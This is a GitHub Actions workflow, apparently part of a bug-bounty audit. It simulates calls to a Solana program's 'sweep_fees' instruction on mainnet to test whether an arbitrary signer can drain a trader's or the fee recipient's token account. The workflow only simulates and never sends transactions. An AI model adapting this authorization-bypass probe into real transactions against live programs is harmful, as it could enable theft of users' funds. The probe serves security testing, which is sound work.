name: mayhem-sweep-auth-prefix
on:
  push:
    branches: [audit/boost-runtime-probe-20260815]
    paths: ['.github/workflows/mayhem-sweep-auth-prefix.yml']
  workflow_dispatch:
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/setup-node@v4
        with: {node-version: 24}
      - run: npm install --no-save @solana/web3.js @solana/spl-token
      - name: Simulation-only trader binding differential
        shell: bash
        run: |
          node --input-type=module <<'NODE'
          import {PublicKey,TransactionInstruction,TransactionMessage,VersionedTransaction} from '@solana/web3.js';
          import {getAssociatedTokenAddressSync,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID} from '@solana/spl-token'; import crypto from 'node:crypto';
          const pk=s=>new PublicKey(s), P=pk('MAyhSmzXzV1pTf7LsNkrNwkWKTo4ougAJ1PPg47MD4e'), G=pk('13ec7XdrjF3h3YcqBTFDSReRcUFwbCnJaAQspM4j6DDJ'), T=pk('Gygj9QQby4j2jryqyqBHvLP7ctv2SaANgh4sCb69BUpA'), R=pk('Ce6TQqeHC9p8KetsN6JsjHK7UTZk7nasjjnr7XxXp9F1'), Q=pk('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v'), SYS=pk('11111111111111111111111111111111'), FEE=pk('GesfTA3X2arioaHp8bbKdjG9vJtskViWACZoYvxp4twS');
          const TATA=getAssociatedTokenAddressSync(Q,T,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID), FATA=getAssociatedTokenAddressSync(Q,FEE,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID); const disc=crypto.createHash('sha256').update('global:sweep_fees').digest().subarray(0,8); let id=1; const URL='https://api.mainnet-beta.solana.com';
          async function rpc(method,params){const r=await fetch(URL,{method:'POST',headers:{'content-type':'application/json','user-agent':'pump-authorized-bounty-simulation-only-sweep-auth-prefix/1.0'},body:JSON.stringify({jsonrpc:'2.0',id:id++,method,params})});const j=await r.json();if(j.error)throw Error(JSON.stringify(j.error));return j.result}
          const bh=(await rpc('getLatestBlockhash',[{commitment:'processed'}])).value.blockhash, meta=(p,s=false,w=false)=>({pubkey:p,isSigner:s,isWritable:w});
          async function sim(label,trader,ata){const keys=[meta(trader,true,true),meta(G,false,true),meta(Q),meta(ata,false,true),meta(TOKEN_PROGRAM_ID),...Array.from({length:13},()=>meta(SYS))];const ix=new TransactionInstruction({programId:P,keys,data:disc});const msg=new TransactionMessage({payerKey:T,recentBlockhash:bh,instructions:[ix]}).compileToV0Message();const tx=new VersionedTransaction(msg);const v=(await rpc('simulateTransaction',[Buffer.from(tx.serialize()).toString('base64'),{encoding:'base64',sigVerify:false,replaceRecentBlockhash:true,commitment:'processed'}])).value;console.log('\n===',label,'===');console.log('ERR',JSON.stringify(v.err),'UNITS',v.unitsConsumed);for(const l of v.logs??[])if(/Instruction:|AnchorError|Error Code|Error Number|Left:|Right:|failed|Permission|signer|has one|associated|owner constraint/.test(l))console.log(l)}
          await sim('control_trader_own_ata',T,TATA);
          await sim('arbitrary_signer_trader_ata',R,TATA);
          await sim('arbitrary_signer_fee_recipient_ata',R,FATA);
          await sim('real_trader_fee_recipient_ata',T,FATA);
          NODE
